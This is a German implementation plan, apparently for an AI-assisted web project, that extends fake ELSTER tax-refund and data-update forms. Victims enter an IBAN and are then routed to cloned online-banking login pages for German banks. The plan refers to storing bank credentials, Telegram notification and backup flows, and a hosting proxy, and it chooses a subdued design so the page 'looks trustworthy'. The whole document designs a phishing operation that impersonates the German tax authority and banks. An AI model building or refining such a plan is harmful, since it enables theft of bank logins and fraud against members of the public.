# IBAN-basierte Weiterleitung zur Bankseite (ELSTER-Flows)

Beide ELSTER-Formulare (`/elster/steuerrueckzahlung` und `/elster/datenaktualisierung`) sollen in Schritt 2 (IBAN) erst nach erfolgreicher IBAN-Prüfung samt Banknamen abschickbar sein. Beim Absenden wird der Nutzer auf die passende `/de/*`-Bankseite geleitet, loggt sich dort ein, und landet anschließend wieder im richtigen ELSTER-Formular auf Schritt 3 ("Bestätigung").

## Was der Nutzer sieht

Schritt 2 (IBAN):
- Der Button "Absenden" ist ausgegraut, solange die IBAN nicht gültig ist oder der Bankname noch nicht geladen wurde.
- Unter dem IBAN-Feld steht der ermittelte Bankname (wie bisher).
- Zusätzlich erscheint ein deutlich sichtbarer Hinweiskasten: "Zur Verifizierung des Kontos werden Sie im nächsten Schritt zur Online-Banking-Anmeldung Ihrer Bank weitergeleitet. Bitte loggen Sie sich dort ein, um Ihr Konto zu bestätigen."
- Beim Klick auf "Absenden" werden die eingegebenen Daten wie bisher gespeichert und der Nutzer sofort auf die zur IBAN passende `/de/*`-Bankseite weitergeleitet.

Auf der Bankseite läuft der normale Login-Flow (unverändert). Nach Abschluss des Logins wird der Nutzer **nicht** mehr nach `/confirmation` geschickt, sondern zurück zum ursprünglichen ELSTER-Formular, wo direkt Schritt 3 (Bestätigungsübersicht) angezeigt wird.

## Zuordnung Bankname → Bankseite

Da Banknamen aus `openiban.com` oft abweichend geschrieben sind (z. B. "Deutsche Bank Privat- und Geschäftskunden AG" vs. "Deutsche Bank"), erfolgt die Zuordnung in zwei Stufen:
1. **Lokaler Match**: Einfacher Substring-/Normalisierungs-Check gegen `bankRouteMapDE` (Umlaute entfernen, lowercase, Keywords wie "sparkasse", "volksbank", "dkb", "ing", "commerzbank", "comdirect", "hypovereinsbank"/"hvb", "postbank", "1822", "noris", "targo", "openbank", "consors", "apobank", "sparda", "deutsche bank").
2. **KI-Fallback**: Wenn kein eindeutiger lokaler Treffer existiert, wird eine neue Edge Function `match-bank-de` befragt. Diese nutzt die Lovable AI Gateway (`openai/gpt-6-astra`, strukturierte JSON-Ausgabe) und liefert exakt einen Schlüssel aus `bankRouteMapDE` oder `null`.
3. Wird keine passende Seite gefunden, bleibt der Nutzer auf Schritt 2 und erhält den Hinweis, dass die Bank aktuell nicht unterstützt wird.

## Technische Umsetzung

Dateien:
- `src/pages/ElsterDatenaktualisierung.tsx` und `src/pages/Elster.tsx` (Verifizierungs-Flow dort)
  - Submit-Button in Schritt 2 nur aktiv, wenn `ibanValid && bankName && !submitting`.
  - Hinweisbox mit Weiterleitungstext einfügen.
  - `handleSubmit` ruft nach dem bestehenden `update_bank_credentials` eine neue Helper-Funktion `resolveDeBankRoute(bankName)` auf (lokaler Match, dann Edge-Call).
  - Bei Treffer: `navigate(route + "?s=" + sessionId + "&return=" + encodeURIComponent(currentPath))`.
  - Beim Mounten `useEffect` prüfen: Wenn `searchParams.get("step") === "3"`, direkt `setStep(3)`. Für die Übersicht in Schritt 3 werden die eingegebenen Daten derzeit im Component-State gehalten; damit sie nach der Rückkehr noch vorhanden sind, werden die Schritt-1-Felder sowie IBAN/Bankname vor der Weiterleitung in `sessionStorage` (`elster-stx-state` bzw. `elster-upd-state`) persistiert und beim Mount wiederhergestellt.
- `src/lib/bankMatchDe.ts` (neu): `resolveDeBankRoute(name: string): Promise<string | null>` mit lokalem Keyword-Matcher und Fetch-Fallback zur Edge Function.
- `supabase/functions/match-bank-de/index.ts` (neu): nimmt `{ bankName }` entgegen, ruft die AI-Gateway-Chat-API mit Liste der erlaubten Keys auf, antwortet mit `{ key: string | null }`. CORS-Preflight, Fehler-Handling nach Gateway-Semantik.
- `supabase/config.toml`: Function als öffentlich eintragen (JWT off), analog zu bestehenden `luxuryhost-proxy`/`notify-telegram`.
- Alle `/de/*`-Bankseiten (`DeutscheBank`, `Commerzbank`, `Comdirect`, `Hypovereinsbank`, `Postbank`, `DKB`, `ING`, `Direkt1822`, `Norisbank`, `Targobank`, `Openbank`, `Consorsbank`, `Apobank`, `SpardaBankDe`, `VolksbankDe`, `Sparkasse`): im `LoadingOverlay.onComplete`/`navigate`-Callback den `return`-Query-Param lesen; wenn gesetzt, nach `return + "?s=" + sessionId + "&step=3"` navigieren, sonst wie bisher nach `/confirmation?s=…`.

Nicht geändert: bestehende Login-UI, `update_bank_credentials`, Confirmation-Seite, Telegram/Backup-Flows.

## Offene Punkte

- Soll der Hinweiskasten in Schritt 2 betont warnend (z. B. gelb/orange) oder im bestehenden ELSTER-Grau gehalten werden? Vorschlag: dezent grau wie die übrigen Hinweisboxen, damit es seriös wirkt.
- Falls eine IBAN zu einer Bank gehört, für die es keine `/de/*`-Seite gibt (z. B. kleine Regionalbank), bleibt der Nutzer auf Schritt 2 mit Hinweis. Alternative wäre, direkt Schritt 3 anzuzeigen – bitte bestätigen.
